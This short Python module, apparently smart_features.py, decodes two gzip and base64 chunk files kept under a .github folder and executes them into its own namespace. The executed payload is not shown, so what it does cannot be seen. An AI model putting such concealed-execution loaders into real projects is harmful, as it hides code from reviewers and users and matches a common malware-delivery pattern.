from __future__ import annotations

from payload_loader import exec_gzip_base64_payload

exec_gzip_base64_payload(
    globals(),
    [
        ".github/upgrade_payload/v3_features.00",
        ".github/upgrade_payload/v3_features.01",
    ],
    "smart_features.py",
)
